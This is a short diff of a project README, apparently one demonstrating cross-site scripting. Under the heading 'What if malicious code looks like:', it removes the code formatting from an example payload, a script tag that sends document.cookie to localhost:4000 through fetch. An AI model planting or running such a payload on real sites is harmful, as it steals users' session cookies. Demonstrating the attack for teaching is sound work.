@@ -43,5 +43,5 @@ This project uses the following technologies:
 
 
 ### What if malicious code looks like:
-`<script>fetch(`http://localhost:4000?data=${document.cookie}`)</script>`
+<script>fetch(`http://localhost:4000?data=${document.cookie}`)</script>
 
